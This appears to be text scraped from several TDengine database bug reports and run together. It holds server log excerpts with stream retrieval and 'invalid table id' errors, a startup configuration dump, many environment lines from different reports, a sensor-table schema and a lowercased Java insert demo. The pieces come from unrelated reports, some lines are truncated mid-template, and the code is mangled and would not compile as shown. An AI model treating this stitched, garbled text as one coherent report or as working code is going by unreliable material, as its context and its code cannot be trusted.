10/23 22:17:08.664939 tsc warn it shall renew table meta, code:invalid table id, retry:6
10/23 22:17:08.664941 tsc error max retry 5 reached, give up
10/23 22:17:08.664967 htp error context: , fd:24, user:root, query error, code:invalid table id, sqlobj:
10/23 22:17:08.664981 htp error context: , fd:24, code:400, error:invalid table id
10/23 22:17:08.690777 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:09.231391 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:09.620934 dnd msg:status will be processed in mpeer queue
10/23 22:17:09.987953 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:10.195765 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:10.625796 dnd msg:status will be processed in mpeer queue
10/23 22:17:10.736048 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:11.492534 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:11.631108 dnd msg:status will be processed in mpeer queue
10/23 22:17:11.700921 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:12.241262 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:12.636229 dnd msg:status will be processed in mpeer queue
10/23 22:17:12.997714 dnd , msg:heartbeat will be processed in mread queue
10/23 22:17:13.206112 dnd , msg:heartbeat will be processed in mread queue
- os: [ fedora27 ] - memory, cpu, current disk space - tdengine version [2.0.5.1]
- os: any - memory, cpu, current disk space - tdengine version commit 95aa2442e
-centos 8.0 - 8 6g - tdengine version 2.0.3.0
centos 7.0] - memory, cpu, current disk space - tdengine version [2.5.1] [root@elastic01 log]# rpm -q centos-release
centos-release-7-8.2003.0.el7.centos.x86_64
- os: any - memory, cpu, current disk space - tdengine version develop branch and commit 95aa2442e
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- server os: [centos 7.0] - client os: [windows 10] - tdengine version [2.0.5.1] compiled by source code on github.
- os: linux xxx-virtualbox 5.4.0-48-generic #52-ubuntu smp thu sep 10 10:58:49 utc 2020 x86_64 x86_64 x86_64 gnu/linux - tdengine version [git commit: b4472552e6bea0ec827b502b7155dd1a4c30c970]
- os: linux centos8 - memory, cpu, current disk space 6gb - tdengine version .5.0.1
- os: win10 wsl 1 - 8gb, intel i5 - tdengine version: 2.0.5.1
- os: linux xxx-virtualbox 5.4.0-48-generic #52-ubuntu smp thu sep 10 10:58:49 utc 2020 x86_64 x86_64 x86_64 gnu/linux - tdengine version [git commit d8a239bf59970e859c16c0b7b7312bf17caf8934]
- os: linux centos8 - memory, cpu, current disk space: 8 6g 00gb - tdengine version .0.5.1
- os: linux centos8 - memory, cpu, current disk space 6g 00gb - tdengine version .0.5.0
- os: linux centos8 - memory, cpu, current disk space 6gb 00gb - tdengine version .0.5.0
- os: linux centos8 - memory, cpu, current disk space 6gb core 00gbdist - tdengine version .0.5.0 ** **
create table if not exists device_data_up( time timestamp,
ai_pick_udata double,
ai_prod_nper double,
ai_prod_npick double,
ai_product_eff double,
ai_product_quantity double,
ai_product_time_min double,
ai_prod_nproding double,
di_belowclosts double,
di_belowopnsts double,
di_candy_outbeelinea double,
di_candy_outbeelineb double,
di_candy_outbeelinec double,
di_chuckclosts double,
di_chuckopnsts double,
di_coverclosts double,
di_coveropnsts double,
di_ctnclo_bstart double,
di_ctnopn_bstart double,
di_denso_bautost double,
di_denso_berror double,
di_denso_bmotoronst double,
di_denso_bready double,
di_denso_brunning double,
di_epson_berror double,
di_epson_bestopon double,
di_epson_bmotoronst double,
di_epson_bready double,
di_epson_brunning double,
di_leftpushclosts double,
di_leftpushopnsts double,
di_print_brunning double,
di_rightclosts double,
di_rightopnsts double,
di_rightpushclosts double,
di_rightpushlopn double,
di_rlclosts double,
di_rlopnsts double,
di_robot1_blinksts double,
di_robot1_bstart double,
di_robot2_blinksts double,
di_robot2tostor double,
di_robot2towai double,
di_sys_brunning double,
di_topclosts double,
di_topopnsts double,
di_updownclosts double,
di_updownopnsts double,
di_bbeltsensorovt double,
di_bctnclocoopnovt double,
di_bctnclorcloovt double,
di_bctncloropnovt double,
di_bctnclotcloovt double,
di_bctnclotopnovt double,
di_bctnovt double,
di_belowvalcloovt double,
di_belowvalopnovt double,
di_brobot2valclovt double,
di_brobot2valopovt double,
di_brtsuckerovt double,
di_bvalcovercloovt double,
di_chucjvalcloovt double,
di_chucjvalopovt double,
di_chuckvalopnovt double,
di_densoberror double,
di_epsonberror double,
di_insenctnalarm double,
di_leftnewvalclovt double,
di_rlnewopvalopovt double,
di_rlnewvalcloovt double,
di_updownnvalclovt double,
di_updownnvalopovt double)
tags (productkey nchar(256), devicename nchar(256)) **java **
package com.rexel.tdengine.api; import com.alibaba.fastjson.jsonobject;
import com.rexel.tdengine.utils.tdutils;
import java.sql.connection;
import java.sql.sqlexception;
import java.sql.statement;
import java.text.simpledateformat;
import java.util.date; /** * @classname createdatabase * @description createdatabase * @author: chunhui.qu * @date: 2020/10/12 */
public class insertjson { public static void main(string[] args) throws sqlexception { tdutils tdutils = tdutils.getinstance(); connection conn = tdutils.getconnection(); if (conn == null) { return; } system.out.println("get connection"); statement stmt = conn.createstatement(); if (stmt == null) { return; } string demostr = "{\ " + " \\"table\\":\\"device_data_up\\",\ "
// + " \\"time\\":1585221653319,\ " + " \\"tags\\":{\ " + " \\"productkey\\":\\"a1b6t6zg6or\\",\ " + " \\"devicename\\":\\"qchtestdevice1\\"\ " + " },\ " + " \\"data\\":{\ " + " \\"ai_pick_udata\\":11,\ " + " \\"ai_prod_nper\\":12,\ " + " \\"ai_prod_npick\\":13,\ " + " \\"ai_product_eff\\":13,\ " + " \\"ai_product_quantity\\":0,\ " + " \\"ai_product_time_min\\":0,\ " + " \\"ai_prod_nproding\\":0,\ " + " \\"di_belowclosts\\":0,\ " + " \\"di_belowopnsts\\":0,\ " + " \\"di_candy_outbeelinea\\":0,\ " + " \\"di_candy_outbeelineb\\":0,\ " + " \\"di_candy_outbeelinec\\":0,\ " + " \\"di_chuckclosts\\":0,\ " + " \\"di_chuckopnsts\\":0,\ " + " \\"di_coverclosts\\":0,\ " + " \\"di_coveropnsts\\":0,\ " + " \\"di_ctnclo_bstart\\":0,\ " + " \\"di_ctnopn_bstart\\":0,\ " + " \\"di_denso_bautost\\":0,\ " + " \\"di_denso_berror\\":0,\ " + " \\"di_denso_bmotoronst\\":0,\ " + " \\"di_denso_bready\\":0,\ " + " \\"di_denso_brunning\\":0,\ " + " \\"di_epson_berror\\":0,\ " + " \\"di_epson_bestopon\\":0,\ " + " \\"di_epson_bmotoronst\\":0,\ " + " \\"di_epson_bready\\":0,\ " + " \\"di_epson_brunning\\":0,\ " + " \\"di_leftpushclosts\\":0,\ " + " \\"di_leftpushopnsts\\":0,\ " + " \\"di_print_brunning\\":0,\ " + " \\"di_rightclosts\\":0,\ " + " \\"di_rightopnsts\\":0,\ " + " \\"di_rightpushclosts\\":0,\ " + " \\"di_rightpushlopn\\":0,\ " + " \\"di_rlclosts\\":0,\ " + " \\"di_rlopnsts\\":0,\ " + " \\"di_robot1_blinksts\\":0,\ " + " \\"di_robot1_bstart\\":0,\ " + " \\"di_robot2_blinksts\\":0,\ " + " \\"di_robot2tostor\\":0,\ " + " \\"di_robot2towai\\":0,\ " + " \\"di_sys_brunning\\":0,\ " + " \\"di_topclosts\\":0,\ " + " \\"di_topopnsts\\":0,\ " + " \\"di_updownclosts\\":0,\ " + " \\"di_updownopnsts\\":0,\ " + " \\"di_bbeltsensorovt\\":0,\ " + " \\"di_bctnclocoopnovt\\":0,\ " + " \\"di_bctnclorcloovt\\":0,\ " + " \\"di_bctncloropnovt\\":0,\ " + " \\"di_bctnclotcloovt\\":0,\ " + " \\"di_bctnclotopnovt\\":0,\ " + " \\"di_bctnovt\\":0,\ " + " \\"di_belowvalcloovt\\":0,\ " + " \\"di_belowvalopnovt\\":0,\ " + " \\"di_brobot2valclovt\\":0,\ " + " \\"di_brobot2valopovt\\":0,\ " + " \\"di_brtsuckerovt\\":0,\ " + " \\"di_bvalcovercloovt\\":0,\ " + " \\"di_chucjvalcloovt\\":0,\ " + " \\"di_chucjvalopovt\\":0,\ " + " \\"di_chuckvalopnovt\\":0,\ " + " \\"di_densoberror\\":0,\ " + " \\"di_epsonberror\\":0,\ " + " \\"di_insenctnalarm\\":0,\ " + " \\"di_leftnewvalclovt\\":0,\ " + " \\"di_rlnewopvalopovt\\":0,\ " + " \\"di_rlnewvalcloovt\\":0,\ " + " \\"di_updownnvalclovt\\":0,\ " + " \\"di_updownnvalopovt\\":0\ " + " }\ " + "}"; jsonobject demojson = jsonobject.parseobject(demostr); while(true) { string sql = jsontosql(demojson); stmt.executeupdate(sql); try { thread.sleep(5000); } catch (interruptedexception e) { e.printstacktrace(); } } } private static string jsontosql(jsonobject jsonobject) { string sql = "insert into {table} ({fields}) values ({values});"; sql = sql.replace("{table}", gettable(jsonobject)); sql = sql.replace("{fields}", getfields(jsonobject)); return sql.replace("{values}", getvalues(jsonobject)); } private static string gettable(jsonobject jsonobject) { return "t_" + jsonobject.getstring("table"); } private static string gettime(jsonobject jsonobject) { if (jsonobject.containskey("time")) { return timelongtostr(jsonobject.getlong("time")); } else { return timelongtostr(system.currenttimemillis()); } } private static string getfields(jsonobject jsonobject) { jsonobject datajson = jsonobject.getjsonobject("data"); stringbuilder sb = new stringbuilder(); sb.append("time").append(","); datajson.foreach((key, value) -> { sb.append(key).append(","); }); return sb.substring(0, sb.length() - 1); } private static string getvalues(jsonobject jsonobject) { jsonobject datajson = jsonobject.getjsonobject("data"); stringbuilder sb = new stringbuilder(); sb.append("\\"").append(gettime(jsonobject)).append("\\"").append(","); datajson.foreach((key, value) -> { sb.append(value).append(","); }); return sb.substring(0, sb.length() - 1); } private static string timelongtostr(long time) { simpledateformat sdf = new simpledateformat("yyyy-mm-dd hh:mm:ss.sss"); return sdf.format(new date(time)); }
- os:centos linux release 7.4.1708 (core) - memory 16g, cpu 8, current disk space 200g - tdengine version 2.0.5.0
- os: rhel 7.6 - tdengine version 1.6.5.9
centos 6.5] - tdengine version [2.0.4.0] - not in batch insert mode, thread num was 2
- os: linux centos8 - memory, cpu, current disk space 6g 00gb - tdengine version .0.5.0
- os: debian 9 - memory, cpu, current disk space - tdengine version 2.0.5.0
ubuntu server 12] - memory, cpu, current disk space - tdengine version [e.g
centos 7.0] - memory, cpu, current disk space - tdengine version **tdengine-1.6.3.0-3.x86_64**
- os: ocker - memory, cpu, current disk space - tdengine version .0.4.0
- tdengine client version: taos-jdbcdriver-2.0.7
- os: centos 7.0 - memory 16g cpu 16 current disk space 500g - tdengine version ersion:2.0.3.1
- os: ubuntu - memory, cpu, current disk space - tdengine version 2.0.3.0
centos 7.0] - memory, cpu, current disk space - tdengine version 2.0.3
- os: ubuntu9.3.0 - tdengine version 2.0.3.0
- os: centos7.8 - memory, cpu, current disk space - tdengine version 2.0.1 ersion 2.0.3
- os:centos - memory 2g, cpu:1c, current disk space:40g - tdengine version 2.0.4
- os: centos linux release 7.8.2003 (core) - memory vailable 326, cpu 0% , current disk space vail 36g - tdengine version [2.0.0.1] **additional [context**](url)
os: ubuntu 16.04 server
16gb, i5 8600 3.10ghz, 1t ssd
tdengine version [ 2.0.3.1]
- os: [centos 7.5] - memory, cpu, current disk space - tdengine version [2.0.31] - taos-jdbcdriver [2.0.4] - mybatis-spring-boot-starter [2.1.1]
- jdbc 2.0.4 tdengine 2.0.4 - memory: 2g, cpu:1c, 40g - tdengine version 2.0.4
- os: client:windwos10 server:ubuntu18 - memory:4g, cpu:2core, current disk space:30g - tdengine version server:2.0.3.1 jdbc:2.0.6
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os:linux version 3.10.0-957.el7.x86_64 - memory, cpu, current disk space
16g 4 1t - tdengine version version: 2.0.2.1
- os:linux version 3.10.0-957.el7.x86_64 - memory, cpu, current disk space
16g 4 1t - tdengine version version: 2.0.2.1
- os: [ubuntu 18.04] - memory 16gb, cpu: 8 intel(r) core(tm) i7-6700 cpu @ 3.40ghz, current disk space 1tb - tdengine version [e.g
2.0.3.1] - etbeans-8.2
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: ubuntu 16.04 server - 16gb, i5 8600 3.10ghz, 1t ssd - tdengine version [ 2.0.3.1]
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: centos 7.2 - 4c 16g - tdengine version 2.0.1.0
- os: centos 7.2 - memory, cpu, current disk space enough - tdengine version [2.0.3.0]
- os: centos 6.9 - tdengine version ver-2.0.3.0
- centos 8.1.1911 - 4 g 40g - tdengine version 2.0.1.0
- os: alpine 3.12 - memory, cpu, current disk space - tdengine version v2.0.2.2
centos 7.0] - memory, cpu, current disk space - tdengine version [e.g
- os: windows 10 - tdengine version 2.0
nodejs -- "td2.0-connector@2.0.1",
has install tdengine-client-2.0.2.1-windows-x64
- tdengine version [2.0+] ```select max(windspeed) from devices interval(10m) sliding(5m)```
![image]( ** **
08/28 00:27:16.062851 dnd dnode mgmt is initialized
08/28 00:27:16.062886 mnd starting to initialize mnode ...
08/28 00:27:16.063528 mnd sdb write is opened
08/28 00:27:16.063538 sdb open sdb wal for restore
08/28 00:27:16.063869 mnd cluster id is set to be289e93-a157-4be2-8edc-649d0f8033ae
08/28 00:27:16.063882 mnd update mnodes epset, numofeps:1 08/28 00:27:16.063903 mnd mnode:1, ep:364407f8615f:6030 master
08/28 00:27:16.064132 sdb sdb is restored, ver:21 totalrows:19 numoftables:9
08/28 00:27:16.064143 sdb work as mnode, replica:1
08/28 00:27:16.064151 sdb mnode:1, 364407f8615f:6040
08/28 00:27:16.064205 sdb mnode role changed from master to master
08/28 00:27:16.064211 sdb update mnodes sync roles, total:1
08/28 00:27:16.064214 sdb mnode:1, role:master
08/28 00:27:16.064221 mnd cluster id is set to be289e93-a157-4be2-8edc-649d0f8033ae
08/28 00:27:16.064228 mnd update mnodes epset, numofeps:1 08/28 00:27:16.064244 mnd mnode:1, ep:364407f8615f:6030 master
08/28 00:27:16.064263 mnd dnode:1 set access:0 to 0
08/28 00:27:16.064354 mnd mnode is initialized successfully
08/28 00:27:16.064426 utl the old unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 00:27:16.064436 utl the new unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 00:27:16.064448 utl _sysctl(kern_core_uses_pid) set fail: operation not permitted
08/28 00:27:16.064455 utl the old core_uses_pid[4]: 0
08/28 00:27:16.064462 utl _sysctl(kern_core_uses_pid) get fail: operation not permitted
08/28 00:27:16.064469 utl the new core_uses_pid[4]: 0
08/28 00:27:16.064781 dnd dnode mgmt timer is initialized
08/28 00:27:16.065134 dnd shell rpc server is opened
08/28 00:27:16.065159 htp start http server ...
08/28 00:27:16.065353 mon start monitor module
08/28 00:27:16.065365 dnd tdengine is initialized successfully
08/28 00:27:16.065383 htp http server init success at 6041
08/28 00:27:16.078795 mon starting to initialize monitor service ..
08/28 00:27:16.079499 mnd user:monitor login from 172.17.0.2, result:success
08/28 00:27:16.079985 mon dnode:364407f8615f:6030 is started
08/28 00:27:16.080880 mon monitor service init success
08/28 00:27:16.569061 dnd module status:6 is received, start mnode module
08/28 00:27:16.569075 mnd mnode module already started...
08/28 00:29:20.336741 mnd user:root login from 172.17.0.2, result:success
08/28 00:30:39.074680 mnd user:_root login from 127.0.0.1, result:success
08/28 00:30:39.075302 tsc warn stream: , last timestamp:0, reset to:1598574540000
08/28 00:31:15.639139 tsc error qhandle is null
08/28 00:31:15.639166 tsc error add into queued async res, code:invalid qhandle
08/28 00:31:15.639184 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:31:46.939328 tsc error qhandle is null
08/28 00:31:46.939341 tsc error add into queued async res, code:invalid qhandle
08/28 00:31:46.939357 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:32:01.494097 tsc error qhandle is null
08/28 00:32:01.494111 tsc error add into queued async res, code:invalid qhandle
08/28 00:32:01.494124 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:32:26.174284 tsc error qhandle is null
08/28 00:32:26.174295 tsc error add into queued async res, code:invalid qhandle
08/28 00:32:26.174309 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:32:54.689350 tsc error qhandle is null
08/28 00:32:54.689370 tsc error add into queued async res, code:invalid qhandle
08/28 00:32:54.689385 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:33:22.319300 tsc error qhandle is null
08/28 00:33:22.319313 tsc error add into queued async res, code:invalid qhandle
08/28 00:33:22.319331 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:33:46.174282 tsc error qhandle is null
08/28 00:33:46.174295 tsc error add into queued async res, code:invalid qhandle
08/28 00:33:46.174309 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:34:17.939362 tsc error qhandle is null
08/28 00:34:17.939372 tsc error add into queued async res, code:invalid qhandle
08/28 00:34:17.939386 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:34:35.359098 tsc error qhandle is null
08/28 00:34:35.359112 tsc error add into queued async res, code:invalid qhandle
08/28 00:34:35.359126 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:35:09.939299 tsc error qhandle is null
08/28 00:35:09.939312 tsc error add into queued async res, code:invalid qhandle
08/28 00:35:09.939324 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:35:26.344123 tsc error qhandle is null
08/28 00:35:26.344137 tsc error add into queued async res, code:invalid qhandle
08/28 00:35:26.344150 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:35:42.994098 tsc error qhandle is null
08/28 00:35:42.994111 tsc error add into queued async res, code:invalid qhandle
08/28 00:35:42.994124 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:36:11.009294 tsc error qhandle is null
08/28 00:36:11.009307 tsc error add into queued async res, code:invalid qhandle
08/28 00:36:11.009320 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:36:22.848235 tsc warn stream: , last timestamp:0, reset to:1598574000000
08/28 00:36:44.939166 tsc error qhandle is null
08/28 00:36:44.939180 tsc error add into queued async res, code:invalid qhandle
08/28 00:36:44.939193 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:37:16.069300 tsc error qhandle is null
08/28 00:37:16.069312 tsc error add into queued async res, code:invalid qhandle
08/28 00:37:16.069330 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:37:32.939170 tsc error qhandle is null
08/28 00:37:32.939185 tsc error add into queued async res, code:invalid qhandle
08/28 00:37:32.939204 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:37:34.033929 tsc error qhandle is null
08/28 00:37:34.033943 tsc error add into queued async res, code:invalid qhandle
08/28 00:37:34.033956 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:37:56.424331 tsc error qhandle is null
08/28 00:37:56.424343 tsc error add into queued async res, code:invalid qhandle
08/28 00:37:56.424357 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:38:17.939296 tsc error qhandle is null
08/28 00:38:17.939308 tsc error add into queued async res, code:invalid qhandle
08/28 00:38:17.939322 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:38:27.214109 tsc error qhandle is null
08/28 00:38:27.214125 tsc error add into queued async res, code:invalid qhandle
08/28 00:38:27.214138 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:38:49.204301 tsc error qhandle is null
08/28 00:38:49.204314 tsc error add into queued async res, code:invalid qhandle
08/28 00:38:49.204328 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:39:06.939354 tsc error qhandle is null
08/28 00:39:06.939379 tsc error add into queued async res, code:invalid qhandle
08/28 00:39:06.939395 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:39:23.939105 tsc error qhandle is null
08/28 00:39:23.939120 tsc error add into queued async res, code:invalid qhandle
08/28 00:39:23.939134 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:39:47.939272 tsc error qhandle is null
08/28 00:39:47.939285 tsc error add into queued async res, code:invalid qhandle
08/28 00:39:47.939296 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:39:51.044098 tsc error qhandle is null
08/28 00:39:51.044111 tsc error add into queued async res, code:invalid qhandle
08/28 00:39:51.044123 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:40:20.449298 tsc error qhandle is null
08/28 00:40:20.449311 tsc error add into queued async res, code:invalid qhandle
08/28 00:40:20.449325 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:40:35.524096 tsc error qhandle is null
08/28 00:40:35.524107 tsc error add into queued async res, code:invalid qhandle
08/28 00:40:35.524122 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:40:35.938944 tsc error qhandle is null
08/28 00:40:35.938958 tsc error add into queued async res, code:invalid qhandle
08/28 00:40:35.938974 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:40:55.584260 tsc error qhandle is null
08/28 00:40:55.584272 tsc error add into queued async res, code:invalid qhandle
08/28 00:40:55.584286 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:41:12.940548 tsc error qhandle is null
08/28 00:41:12.940561 tsc error add into queued async res, code:invalid qhandle
08/28 00:41:12.940575 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:41:16.324110 tsc error qhandle is null
08/28 00:41:16.324124 tsc error add into queued async res, code:invalid qhandle
08/28 00:41:16.324141 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:41:33.014271 tsc error qhandle is null
08/28 00:41:33.014284 tsc error add into queued async res, code:invalid qhandle
08/28 00:41:33.014298 tsc error stream: , retrieve data failed, code: , retry in 10000ms
08/28 00:41:45.939112 tsc error qhandle is null
08/28 00:41:45.939126 tsc error add into queued async res, code:invalid qhandle
08/28 00:41:45.939142 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:42:02.179155 tsc error qhandle is null
08/28 00:42:02.179169 tsc error add into queued async res, code:invalid qhandle
08/28 00:42:02.179183 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:42:17.939317 tsc error qhandle is null
08/28 00:42:17.939329 tsc error add into queued async res, code:invalid qhandle
08/28 00:42:17.939345 tsc error stream: , retrieve data failed, code: , retry in 11000ms
08/28 00:42:25.679111 tsc error qhandle is null
08/28 00:42:25.679126 tsc error add into queued async res, code:invalid qhandle
08/28 00:42:25.679142 tsc error stream: , retrieve data failed, code: , retry in 12000ms
08/28 00:45:48.793725 utl the old unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 00:45:48.793742 utl the new unlimited para: rlim_cur=18446744073709551615, rlim_max=18446744073709551615
08/28 00:45:48.793759 utl _sysctl(kern_core_uses_pid) set fail: operation not permitted
08/28 00:45:48.793762 utl the old core_uses_pid[4]: 0
08/28 00:45:48.793768 utl _sysctl(kern_core_uses_pid) get fail: operation not permitted
08/28 00:45:48.793771 utl the new core_uses_pid[4]: 0
08/28 00:45:48.794101 utl localep is: 364407f8615f:6030
08/28 00:45:48.795480 utl timezone not configured, set to system default: (utc, +0000)
08/28 00:45:48.795528 utl error locale not configured, set to system default:en_us.utf-8
08/28 00:45:48.795540 utl warn charset not configured, set to system default:utf-8
08/28 00:45:48.795582 utl taos config & system info:
08/28 00:45:48.795588 utl ==================================
08/28 00:45:48.795592 utl firstep: 364407f8615f:6030 08/28 00:45:48.795598 utl secondep: 364407f8615f:6030 08/28 00:45:48.795600 utl fqdn: 364407f8615f 08/28 00:45:48.795602 utl serverport: 6030 08/28 00:45:48.795608 utl configdir: /etc/taos 08/28 00:45:48.795611 utl logdir: /var/log/taos 08/28 00:45:48.795616 utl scriptdir: /etc/taos 08/28 00:45:48.795621 utl datadir: /var/lib/taos 08/28 00:45:48.795625 utl arbitrator: 08/28 00:45:48.795627 utl numofthreadspercore: 1.000000 08/28 00:45:48.795643 utl ratioofquerythreads: 0.500000 08/28 00:45:48.795647 utl numofmnodes: 3 08/28 00:45:48.795654 utl vnodebak: 1 08/28 00:45:48.795658 utl telemetryreporting: 1 08/28 00:45:48.795662 utl balance: 1 08/28 00:45:48.795665 utl balanceinterval: 300 08/28 00:45:48.795668 utl role: 0 08/28 00:45:48.795670 utl maxtmrctrl: 512 08/28 00:45:48.795672 utl monitorinterval: 30(s)
08/28 00:45:48.795675 utl offlinethreshold: 8640000(s)
08/28 00:45:48.795678 utl rpctimer: 1000(ms)
08/28 00:45:48.795684 utl rpcmaxtime: 600(s)
08/28 00:45:48.795687 utl statusinterval: 1(s)
08/28 00:45:48.795694 utl shellactivitytimer: 3(s)
08/28 00:45:48.795697 utl tablemetakeeptimer: 7200(s)
08/28 00:45:48.795701 utl minslidingtime: 10(ms)
08/28 00:45:48.795707 utl minintervaltime: 10(ms)
08/28 00:45:48.795710 utl maxstreamcompdelay: 20000(ms)
08/28 00:45:48.795715 utl maxfirststreamcompdelay:10000(ms)
08/28 00:45:48.795720 utl retrystreamcompdelay: 10(ms)
08/28 00:45:48.795724 utl streamcompdelayratio: 0.100000 08/28 00:45:48.795731 utl maxvgroupsperdb: 0 08/28 00:45:48.795733 utl maxtablespervnode: 1000000 08/28 00:45:48.795736 utl mintablespervnode: 1000 08/28 00:45:48.795743 utl tableincsteppervnode: 1000 08/28 00:45:48.795745 utl cache: 16(mb)
08/28 00:45:48.795752 utl blocks: 6 08/28 00:45:48.795754 utl days: 2 08/28 00:45:48.795757 utl keep: 3650 08/28 00:45:48.795763 utl minrows: 100 08/28 00:45:48.795766 utl maxrows: 4096 08/28 00:45:48.795769 utl comp: 2 08/28 00:45:48.795776 utl wallevel: 1 08/28 00:45:48.795778 utl fsync: 3000 08/28 00:45:48.795782 utl replica: 1 08/28 00:45:48.795788 utl quorum: 1 08/28 00:45:48.795791 utl compressmsgsize: -1 08/28 00:45:48.795796 utl maxsqllength: 65480(byte)
08/28 00:45:48.795799 utl maxnumoforderedres: 100000 08/28 00:45:48.795807 utl timezone: (utc, +0000) 08/28 00:45:48.795810 utl locale: en_us.utf-8 08/28 00:45:48.795817 utl charset: utf-8 08/28 00:45:48.795819 utl maxshellconns: 5000 08/28 00:45:48.795822 utl maxconnections: 5000 08/28 00:45:48.795828 utl minimallogdirgb: 0.100000(gb)
08/28 00:45:48.795830 utl minimaltmpdirgb: 0.100000(gb)
08/28 00:45:48.795836 utl minimaldatadirgb: 0.500000(gb)
08/28 00:45:48.795841 utl mnodeequalvnodenum: 4 08/28 00:45:48.795844 utl http: 1 08/28 00:45:48.795851 utl mqtt: 0 08/28 00:45:48.795853 utl monitor: 1 08/28 00:45:48.795859 utl httpcachesessions: 1000 08/28 00:45:48.795864 utl httpenablerecordsql: 0 08/28 00:45:48.795867 utl telegrafusefieldnum: 0 08/28 00:45:48.795874 utl httpmaxthreads: 2 08/28 00:45:48.795877 utl restfulrowlimit: 10240 08/28 00:45:48.795882 utl numofloglines: 10000000 08/28 00:45:48.795886 utl asynclog: 1 08/28 00:45:48.795893 utl debugflag: 0 08/28 00:45:48.795896 utl mdebugflag: 135 08/28 00:45:48.795901 utl ddebugflag: 135 08/28 00:45:48.795904 utl sdebugflag: 135 08/28 00:45:48.795910 utl wdebugflag: 135 08/28 00:45:48.795914 utl sdbdebugflag: 135 08/28 00:45:48.795918 utl rpcdebugflag: 131 08/28 00:45:48.795924 utl tmrdebugflag: 131 08/28 00:45:48.795926 utl cdebugflag: 131 08/28 00:45:48.795932 utl jnidebugflag: 131 08/28 00:45:48.795937 utl odbcdebugflag: 131 08/28 00:45:48.795939 utl udebugflag: 131 08/28 00:45:48.795941 utl httpdebugflag: 131 08/28 00:45:48.795946 utl mqttdebugflag: 131 08/28 00:45:48.795951 utl monitordebugflag: 131 08/28 00:45:48.795954 utl qdebugflag: 131 08/28 00:45:48.795961 utl vdebugflag: 131 08/28 00:45:48.795963 utl tsdbdebugflag: 131 08/28 00:45:48.795966 utl tscenablerecordsql: 0 08/28 00:45:48.795973 utl enablecorefile: 1 08/28 00:45:48.795976 utl gitinfo: 7ac6c2b8de3cd66e180132fc1cf77715237308a1 08/28 00:45:48.795983 utl gitinfoofinternal: 08/28 00:45:48.795985 utl buildinfo: built by root at 2020-08-17 11:12 08/28 00:45:48.795989 utl version: 2.0.1.0 08/28 00:45:48.795994 utl maxbinarydisplaywidth: 30 08/28 00:45:48.795997 utl os pagesize: 4096(kb)
08/28 00:45:48.796002 utl os openmax: 65536
08/28 00:45:48.796007 utl os streammax: 16
08/28 00:45:48.796011 utl os numofcores: 24
08/28 00:45:48.796017 utl os totaldisk: 7367.283203(gb)
08/28 00:45:48.796022 utl os totalmemory: 63723(mb)
08/28 00:45:48.796030 utl os sysname: linux
08/28 00:45:48.796036 utl os nodename: 364407f8615f
08/28 00:45:48.796038 utl os release: 3.10.0-957.el7.x86_64
08/28 00:45:48.796042 utl os version: #1 smp fri jan 11 17:34:50 cst 2019
08/28 00:45:48.796048 utl os machine: x86_64
08/28 00:45:48.796056 utl ==================================
08/28 00:45:48.796059 dnd start to initialize tdengine on 364407f8615f:6030
08/28 00:45:48.796218 dnd storage directory is initialized
08/28 00:45:48.796229 dnd dnode read is opened, min worker:24 max worker:48
08/28 00:45:48.796237 dnd dnode write is opened, max worker 24
08/28 00:45:48.796243 dnd dnode mread is opened
08/28 00:45:48.796245 dnd dnode mwrite is opened
08/28 00:45:48.796250 dnd dnode mpeer is opened
08/28 00:45:48.796622 dnd inter-dnodes rpc client is opened
08/28 00:45:48.796768 dnd inter-dnodes rpc server is opened
08/28 00:45:48.796810 dnd read numofvnodes successed, dnodeid:1
08/28 00:45:48.796843 dnd read mnode epset successed, numofeps:1 inuse:0
